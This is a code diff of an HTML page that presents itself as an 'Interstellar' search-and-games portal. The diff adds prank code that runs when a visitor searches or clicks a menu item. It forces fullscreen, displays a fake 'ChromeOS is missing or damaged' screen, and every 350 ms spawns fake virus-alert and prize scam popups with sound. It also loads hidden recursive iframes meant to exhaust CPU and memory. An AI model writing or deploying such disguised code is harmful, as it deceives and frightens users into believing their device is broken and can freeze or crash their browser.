@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SidneyStellar</title>
+    <title>SidneyStellar | Interstellar</title>
     <style>
         :root {
             --bg-color: #050505;
@@ -40,152 +40,81 @@
             font-family: Arial, sans-serif;
         }
 
-        .error-icon {
-            font-size: 120px;
-            color: #d93025;
-            font-weight: bold;
-            margin-bottom: 20px;
-        }
-
-        .error-title {
-            font-size: 28px;
-            margin-bottom: 10px;
-            color: #333;
-        }
-
-        .error-sub {
-            font-size: 18px;
-            margin-bottom: 40px;
-        }
-
-        .error-code {
-            position: absolute;
-            bottom: 20px;
-            left: 20px;
-            font-size: 12px;
-            color: #999;
-            text-align: left;
-        }
-
         .yellow-exclamation {
             display: inline-block;
-            width: 100px;
-            height: 100px;
+            width: 100px; height: 100px;
             background-color: #f4b400;
-            color: white;
-            font-size: 70px;
-            line-height: 100px;
-            border-radius: 10px;
-            margin-bottom: 30px;
+            color: white; font-size: 70px;
+            line-height: 100px; border-radius: 10px; margin-bottom: 30px;
         }
 
-        /* --- ORIGINAL INTERSTELLAR STYLES --- */
-        .brand-logo {
-            position: fixed;
-            top: 25px;
-            left: 25px;
-            background: var(--white);
+        .error-title { font-size: 28px; margin-bottom: 10px; color: #333; }
+        .error-sub { font-size: 18px; margin-bottom: 40px; }
+
+        /* --- POPUP & SCAM STYLES --- */
+        .scam-popup {
+            position: absolute;
+            width: 320px;
+            border: 4px solid #000;
+            box-shadow: 15px 15px 0px rgba(0,0,0,0.4);
+            z-index: 10001;
+            cursor: move;
+            font-family: "Comic Sans MS", "Arial", sans-serif;
+        }
+
+        .popup-header {
+            background: linear-gradient(to right, #0000aa, #44aaff);
+            color: white;
+            padding: 6px;
+            display: flex;
+            justify-content: space-between;
+            font-weight: bold;
+            border-bottom: 3px solid black;
+        }
+
+        .close-btn {
+            background: #dfdfdf;
+            border: 2px outset white;
+            padding: 0 6px;
+            cursor: pointer;
             color: black;
-            font-weight: 900;
-            padding: 10px 14px;
-            border-radius: 4px;
-            font-size: 20px;
-            letter-spacing: -0.5px;
-            line-height: 1;
-            z-index: 100;
         }
 
-        nav {
-            display: flex;
-            justify-content: flex-end;
-            padding: 30px 50px;
-            z-index: 100;
-        }
-
-        .nav-links { display: flex; gap: 35px; }
-
-        .nav-item {
-            text-decoration: none;
-            color: var(--white);
-            font-size: 11px;
-            font-weight: 700;
-            letter-spacing: 2px;
-            opacity: 0.9;
-        }
-
-        main {
-            flex-grow: 1;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            margin-top: -50px;
-            z-index: 10;
-        }
-
-        h1 {
-            font-size: 90px;
-            margin: 0;
-            font-weight: 800;
-            letter-spacing: 6px;
-        }
-
-        .search-bar {
-            width: 620px;
-            background: #121212;
-            border: none;
-            padding: 20px;
-            border-radius: 6px;
-            color: white;
+        .popup-body {
+            padding: 25px;
             text-align: center;
-            font-size: 16px;
-            outline: none;
+            color: black;
+            font-weight: bold;
         }
 
-        .vivid-shapes {
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            height: 350px;
-            pointer-events: none;
-            z-index: 1;
-        }
+        .blink { animation: blinker 0.4s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
 
-        .glow-shape {
-            position: absolute;
-            bottom: -150px;
-            border-radius: 50%;
-            background: radial-gradient(circle, rgba(255,255,255,0.08) 0%, transparent 70%);
-            filter: blur(80px);
-        }
-
-        .shape-left { width: 1000px; height: 500px; left: -200px; opacity: 0.6; }
-        .shape-right { width: 1200px; height: 600px; right: -300px; bottom: -200px; opacity: 0.4; }
+        /* --- UI ELEMENTS --- */
+        .brand-logo { position: fixed; top: 25px; left: 25px; background: var(--white); color: black; font-weight: 900; padding: 10px 14px; border-radius: 4px; font-size: 20px; z-index: 100; }
+        nav { display: flex; justify-content: flex-end; padding: 30px 50px; z-index: 100; }
+        .nav-links { display: flex; gap: 35px; }
+        .nav-item { text-decoration: none; color: var(--white); font-size: 11px; font-weight: 700; letter-spacing: 2px; cursor: pointer; }
+        main { flex-grow: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; margin-top: -50px; z-index: 10; }
+        h1 { font-size: 90px; margin: 0; font-weight: 800; letter-spacing: 6px; }
+        .search-bar { width: 620px; background: #121212; border: none; padding: 20px; border-radius: 6px; color: white; text-align: center; font-size: 16px; outline: none; }
     </style>
 </head>
 <body>
 
-    <!-- CHROME OS "MISSING OR DAMAGED" SCREEN -->
     <div id="chrome-error">
         <div class="yellow-exclamation">!</div>
         <div class="error-title">ChromeOS is missing or damaged.</div>
         <div class="error-sub">Please insert a recovery USB stick or SD card.</div>
-        
-        <div class="error-code">
-            Model: SIDNEY-STELLAR-PRANK-69420<br>
-            Error: 0x5b No bootable kernel found on disk<br>
-            <span style="color: #ccc; font-style: italic;">(Press Refresh + Power to try again)</span>
-        </div>
     </div>
 
     <div class="brand-logo">IN</div>
 
     <nav>
         <div class="nav-links">
-            <a href="#" class="nav-item">GAMES</a>
-            <a href="#" class="nav-item">APPS</a>
-            <a href="#" class="nav-item">SETTINGS</a>
+            <span class="nav-item" onclick="triggerPrank()">GAMES</span>
+            <span class="nav-item" onclick="triggerPrank()">APPS</span>
+            <span class="nav-item" onclick="triggerPrank()">SETTINGS</span>
         </div>
     </nav>
 
@@ -195,33 +124,87 @@
         <input type="text" id="search" class="search-bar" placeholder="Search with Google or enter address">
     </main>
 
-    <div class="vivid-shapes">
-        <div class="glow-shape shape-left"></div>
-        <div class="glow-shape shape-right"></div>
-    </div>
-
     <script>
         const searchBar = document.getElementById('search');
         const errorScreen = document.getElementById('chrome-error');
+        
+        // Sound source (Classic Windows Error or Alert)
+        const alertSound = "https://www.soundjay.com";
 
-        searchBar.addEventListener('keypress', function (e) {
-            // Check if the key pressed was 'Enter'
-            if (e.key === 'Enter') {
-                // Check if they actually typed something
-                if (searchBar.value.trim() !== "") {
-                    triggerPrank();
-                }
+        searchBar.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter' && searchBar.value.trim() !== "") {
+                triggerPrank();
             }
         });
 
         function triggerPrank() {
-            // Enter Fullscreen to make it look real
+            // Fullscreen attempt
             if (document.documentElement.requestFullscreen) {
-                document.documentElement.requestFullscreen();
+                document.documentElement.requestFullscreen().catch(() => {});
             }
-            
-            // Show the fake ChromeOS recovery screen
+
             errorScreen.style.display = 'block';
+
+            // START THE CHAOS: Spawns popups, sound, and RAM-eating iFrames
+            setInterval(() => {
+                spawnPopup();
+                spawnIframeLag();
+                new Audio(alertSound).play().catch(() => {});
+            }, 350); 
+        }
+
+        const adTemplates = [
+            { title: "SYSTEM CRITICAL", body: "<h2 style='color:red' class='blink'>VIRUS DETECTED!</h2><p>Scanning C:\\ drive...</p><button>DELETE VIRUS</button>", bg: "#ff4444" },
+            { title: "WINNER!!", body: "<h2 style='color:blue'>FREE V-BUCKS!</h2><p>Click to generate code!</p><button>REDEEM</button>", bg: "#44ff44" },
+            { title: "AD ALERT", body: "<h2 style='color:black'>NEW MESSAGE</h2><p>You have (1) pending prize!</p><button>OPEN</button>", bg: "#ffff44" }
+        ];
+
+        function spawnPopup() {
+            const template = adTemplates[Math.floor(Math.random() * adTemplates.length)];
+            const popup = document.createElement('div');
+            popup.className = 'scam-popup';
+            popup.style.left = Math.random() * (window.innerWidth - 320) + "px";
+            popup.style.top = Math.random() * (window.innerHeight - 200) + "px";
+            popup.style.backgroundColor = template.bg;
+
+            popup.innerHTML = `
+                <div class="popup-header">
+                    <span>${template.title}</span>
+                    <div class="close-btn" onclick="this.parentElement.parentElement.remove()">X</div>
+                </div>
+                <div class="popup-body">${template.body}</div>
+            `;
+
+            document.body.appendChild(popup);
+            makeDraggable(popup);
+        }
+
+        function spawnIframeLag() {
+            // Recursive Iframe loading: Eats CPU and RAM rapidly
+            const frame = document.createElement('iframe');
+            frame.style.width = "1px";
+            frame.style.height = "1px";
+            frame.style.opacity = "0.01";
+            frame.src = window.location.href; 
+            document.body.appendChild(frame);
+        }
+
+        function makeDraggable(el) {
+            let p1 = 0, p2 = 0, p3 = 0, p4 = 0;
+            el.onmousedown = (e) => {
+                e.preventDefault();
+                p3 = e.clientX;
+                p4 = e.clientY;
+                document.onmouseup = () => { document.onmouseup = null; document.onmousemove = null; };
+                document.onmousemove = (e) => {
+                    p1 = p3 - e.clientX;
+                    p2 = p4 - e.clientY;
+                    p3 = e.clientX;
+                    p4 = e.clientY;
+                    el.style.top = (el.offsetTop - p2) + "px";
+                    el.style.left = (el.offsetLeft - p1) + "px";
+                };
+            };
         }
     </script>
 </body>
